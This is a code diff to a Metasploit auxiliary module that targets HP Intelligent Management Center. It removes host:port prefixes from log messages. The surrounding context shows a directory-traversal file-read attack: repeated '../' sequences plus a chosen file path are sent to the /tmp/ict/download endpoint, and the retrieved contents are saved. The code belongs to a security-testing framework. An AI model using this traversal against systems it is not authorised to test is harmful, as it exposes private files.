@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     if not is_imc?
-      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - This isn't a HP Intelligent Management Center")
+      vprint_error("This isn't a HP Intelligent Management Center")
       return
     end
 
@@ -76,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
     travs << "../" * datastore['DEPTH']
     travs << datastore['FILEPATH']
 
-    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
+    vprint_status("Sending request...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path.to_s, "tmp", "ict", "download"),
       'method' => 'GET',
@@ -96,9 +96,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
+      vprint_error("Failed to retrieve file")
       return
     end
   end
